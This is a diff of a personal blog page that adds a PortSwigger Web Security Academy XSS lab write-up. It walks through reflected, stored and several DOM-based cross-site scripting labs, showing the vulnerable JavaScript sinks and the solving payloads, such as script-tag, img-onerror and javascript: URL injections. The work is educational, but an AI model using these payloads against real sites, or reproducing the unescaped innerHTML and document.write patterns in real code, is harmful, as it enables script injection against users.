@@ -3,11 +3,11 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Posts | Sairas ko website</title>
-<meta property="og:title" content="Posts | Sairas ko website" />
-<meta name="twitter:title" content="Posts | Sairas ko website" />
-<meta itemprop="name" content="Posts | Sairas ko website" />
-<meta name="application-name" content="Posts | Sairas ko website" />
+<title itemprop="name">Portswigger Xss Lab Part 1 | Sairas ko website</title>
+<meta property="og:title" content="Portswigger Xss Lab Part 1 | Sairas ko website" />
+<meta name="twitter:title" content="Portswigger Xss Lab Part 1 | Sairas ko website" />
+<meta itemprop="name" content="Portswigger Xss Lab Part 1 | Sairas ko website" />
+<meta name="application-name" content="Portswigger Xss Lab Part 1 | Sairas ko website" />
 <meta property="og:site_name" content="Sairas ko Blogs" />
 
 <meta name="description" content="A place where Sairas posts Blogs &amp; stuff">
@@ -18,20 +18,12 @@
 <meta property="og:locale" content="en-gb" />
 <meta name="language" content="en-gb" />
 
-  <link rel="alternate" hreflang="en-gb" href="https://sairas.tech/posts/" title="English" />
+  <link rel="alternate" hreflang="en-gb" href="https://sairas.tech/posts/portswigger-xss-lab-part-1/" title="English" />
 
 
 
 
 
-    
-    
-    
-    
-    
-    <link rel="first" href="/posts/" />
-    <link rel="last" href="/posts/" />
-    
     
     
     
@@ -39,7 +31,7 @@
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2024-12-18T21:07:00&#43;0545 />
     <meta property="article:published_time" content=2024-12-18T21:07:00&#43;0545 />
-    <meta property="og:url" content="https://sairas.tech/posts/" />
+    <meta property="og:url" content="https://sairas.tech/posts/portswigger-xss-lab-part-1/" />
 
     
     <meta property="og:article:author" content="Sairas" />
@@ -54,14 +46,14 @@
     {
         "@context": "http://schema.org",
         "@type": "Article",
-        "headline": "Posts",
+        "headline": "Portswigger Xss Lab Part 1",
         "author": {
         "@type": "Person",
         "name": ""
         },
         "datePublished": "2024-12-18",
         "description": "",
-        "wordCount":  0 ,
+        "wordCount":  318 ,
         "mainEntityOfPage": "True",
         "dateModified": "2024-12-18",
         "image": {
@@ -79,23 +71,27 @@
 <meta name="generator" content="Hugo 0.123.7">
 
     
-    <meta property="og:title" content="Posts" />
-<meta property="og:description" content="A place where Sairas posts Blogs &amp; stuff" />
-<meta property="og:type" content="website" />
-<meta property="og:url" content="https://sairas.tech/posts/" />
+    <meta property="og:title" content="Portswigger Xss Lab Part 1" />
+<meta property="og:description" content="Reflected XSS into HTML context with nothing encoded Solution: &lt;script&gt;alert(1)&lt;/script&gt; Explaination: &lt;section class=blog-header&gt; &lt;h1&gt;0 search results for &#39;abc123&#39;&lt;/h1&gt; &lt;hr&gt;| &lt;/section&gt; *The vulnerable parameter here is the h1 tag as it can run scripts inside of it so when we search &lt;script&gt;alert(1)&lt;/script&gt; instead of abc123 the htm code becomes
+&lt;section class=blog-header&gt; &lt;h1&gt;0 search results for &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&lt;/h1&gt; &lt;hr&gt; &lt;/section&gt; and it will end up executing the alert script.
+Stored XSS into HTML context with nothing encoded Solution: &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://sairas.tech/posts/portswigger-xss-lab-part-1/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2024-12-18T21:07:00+05:45" />
+<meta property="article:modified_time" content="2024-12-18T21:07:00+05:45" />
 
 
 
     
-    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Posts"/>
-<meta name="twitter:description" content="A place where Sairas posts Blogs &amp; stuff"/>
+    <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Portswigger Xss Lab Part 1"/>
+<meta name="twitter:description" content="Reflected XSS into HTML context with nothing encoded Solution: &lt;script&gt;alert(1)&lt;/script&gt; Explaination: &lt;section class=blog-header&gt; &lt;h1&gt;0 search results for &#39;abc123&#39;&lt;/h1&gt; &lt;hr&gt;| &lt;/section&gt; *The vulnerable parameter here is the h1 tag as it can run scripts inside of it so when we search &lt;script&gt;alert(1)&lt;/script&gt; instead of abc123 the htm code becomes
+&lt;section class=blog-header&gt; &lt;h1&gt;0 search results for &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&lt;/h1&gt; &lt;hr&gt; &lt;/section&gt; and it will end up executing the alert script.
+Stored XSS into HTML context with nothing encoded Solution: &lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;"/>
 
 
     
 
-    <link rel="canonical" href="https://sairas.tech/posts/">
-    <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Sairas ko website">
-    <link href="/posts/index.xml" rel="feed" type="application/rss+xml" title="Sairas ko website">
+    <link rel="canonical" href="https://sairas.tech/posts/portswigger-xss-lab-part-1/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -184,57 +180,158 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Posts</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2024</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/portswigger-xss-lab-part-1/">Portswigger Xss Lab Part 1</a>
-    </h4>
+        <article>
+            <header class="header">
+                <h1 class="header-title">Portswigger Xss Lab Part 1</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2024-12-18T21:07:00&#43;05:45" itemprop="datePublished"> 18 Dec 2024 </time>
+                </div>
+                
+            </header>
+            
     
-    
-    
-    
-    <time class="post-item-meta" datetime="2024-12-18T21:07:00&#43;0545">
-        18 Dec 2024
-        
-    </time>
-</article>
+    <details class="toc" ZgotmplZ>
+        <summary><b>Table of Contents</b></summary>
+        <nav id="TableOfContents">
+  <ul>
+    <li><a href="#reflected-xss-into-html-context-with-nothing-encoded">Reflected XSS into HTML context with nothing encoded</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#solution-scriptalert1script">Solution: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></a></li>
+            <li><a href="#explaination">Explaination:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#stored-xss-into-html-context-with-nothing-encoded">Stored XSS into HTML context with nothing encoded</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#solution">Solution:</a></li>
+            <li><a href="#explaination-1">Explaination:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#dom-xss-indocumentwritesink-using-sourcelocationsearch">DOM XSS in <code>document.write</code> sink using source <code>location.search</code></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#vulnerable-parameter">Vulnerable parameter:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#solution-1">Solution:</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#explaination-2">Explaination:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#dom-xss-ininnerhtmlsink-using-sourcelocationsearch">DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#vulnerable-parameter-1">Vulnerable parameter:</a></li>
+            <li><a href="#solution-2">Solution:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#explaination-3">Explaination:</a></li>
+    <li><a href="#dom-xss-in-jquery-anchorhrefattribute-sink-usinglocationsearchsource">DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</a>
+      <ul>
+        <li>
+          <ul>
+            <li><a href="#vulnerable-parameter-2">Vulnerable parameter:</a></li>
+          </ul>
+        </li>
+        <li><a href="#solution-3">Solution:</a>
+          <ul>
+            <li><a href="#explanation">Explanation:</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </details>
+            <div class="page-content">
+                <h2 id="reflected-xss-into-html-context-with-nothing-encoded">Reflected XSS into HTML context with nothing encoded</h2>
+<h4 id="solution-scriptalert1script">Solution: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code></h4>
+<h4 id="explaination">Explaination:</h4>
+<pre tabindex="0"><code>&lt;section class=blog-header&gt;
+&lt;h1&gt;0 search results for &#39;abc123&#39;&lt;/h1&gt;
+&lt;hr&gt;|
+&lt;/section&gt;
+</code></pre><p>*The vulnerable parameter here is the h1 tag as it can run scripts inside of it so when we search <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> instead of <code>abc123</code> the htm code becomes</p>
+<pre tabindex="0"><code>&lt;section class=blog-header&gt;
+&lt;h1&gt;0 search results for &#39;&lt;script&gt;alert(1)&lt;/script&gt;&#39;&lt;/h1&gt;
+&lt;hr&gt;
+&lt;/section&gt;
+</code></pre><p>and it will end up executing the alert script.</p>
+<h2 id="stored-xss-into-html-context-with-nothing-encoded">Stored XSS into HTML context with nothing encoded</h2>
+<h4 id="solution">Solution:</h4>
+<p><code>&lt;p&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/p&gt;</code></p>
+<h4 id="explaination-1">Explaination:</h4>
+<p>Whatever we put in the comment section is reflected inside the <code>&lt;p&gt;&lt;/p&gt;</code> so if we just put the script inside it, <code>&lt;p&gt;</code> tag being capable of executing scripts and nothing encoded/filtered, it will execute similar to what happened with h1 tag.</p>
+<h2 id="dom-xss-indocumentwritesink-using-sourcelocationsearch">DOM XSS in <code>document.write</code> sink using source <code>location.search</code></h2>
+<h4 id="vulnerable-parameter">Vulnerable parameter:</h4>
+<p><code>document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+query+'&quot;&gt;');</code></p>
+<h2 id="solution-1">Solution:</h2>
+<p><code>&quot;&gt;&lt;img src=x onerror='alert(1)'/&gt;</code></p>
+<h4 id="explaination-2">Explaination:</h4>
+<pre tabindex="0"><code>
+function trackSearch(query) {
+document.write(&#39;&lt;img src=&#34;/resources/images/tracker.gif?searchTerms=&#39;+query+&#39;&#34;&gt;&#39;);
+}
+var query = (new URLSearchParams(window.location.search)).get(&#39;search&#39;);|
+if(query) {|
+trackSearch(query);
+}
+</code></pre><p>As you can see our query is getting in the <code>document.write('&lt;img src=&quot;/resources/images/tracker.gif?searchTerms='+query+'&quot;&gt;');</code> we can break out of the <code>&lt;img&gt;</code> tag and start our own tag as it will be written inside <code>document.write</code> which executes html tags inside it.</p>
+<h2 id="dom-xss-ininnerhtmlsink-using-sourcelocationsearch">DOM XSS in <code>innerHTML</code> sink using source <code>location.search</code></h2>
+<h4 id="vulnerable-parameter-1">Vulnerable parameter:</h4>
+<p><code>document.getElementById('searchMessage').innerHTML = query;</code></p>
+<h4 id="solution-2">Solution:</h4>
+<p><code>&lt;img src=x onerror='alert(1)'/&gt;</code></p>
+<h2 id="explaination-3">Explaination:</h2>
+<pre tabindex="0"><code>&lt;script&gt;
+function doSearchQuery(query) {
+document.getElementById(&#39;searchMessage&#39;).innerHTML = query;
+}
+var query = (new URLSearchParams(window.location.search)).get(&#39;search&#39;);
+if(query) {
+doSearchQuery(query);
+}
+&lt;/script&gt;
+</code></pre><p>whatever we put in the search bar, it is accepted as query and as we can see the query is getting embedded using <code>.innerhtml</code> and it also renders html tags, so it will cause an alert.</p>
+<h2 id="dom-xss-in-jquery-anchorhrefattribute-sink-usinglocationsearchsource">DOM XSS in jQuery anchor <code>href</code> attribute sink using <code>location.search</code> source</h2>
+<h4 id="vulnerable-parameter-2">Vulnerable parameter:</h4>
+<p>`</p>
+<pre tabindex="0"><code>&lt;script&gt;
+$(function() {
+$(&#39;#backLink&#39;).attr(&#34;href&#34;, (new URLSearchParams(window.location.search)).get(&#39;returnPath&#39;));
+});&lt;/script&gt;
+</code></pre><h3 id="solution-3">Solution:</h3>
+<p><code>https://0a4300c40409e0a480b1120a00010026.web-security-academy.net/feedback?returnPath=javascript:alert(1)</code></p>
+<h4 id="explanation">Explanation:</h4>
+<p>The <code>href</code> attribute in the anchor tag is dynamically set using the <code>location.search</code> query parameter, which can be controlled by an attacker. By injecting <code>javascript:alert(1)</code>, the script is executed when the link is clicked.</p>
 
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/annie-ctf/">Annie Ctf</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2024-12-01T01:45:35&#43;0545">
-        1 Dec 2024
-        
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
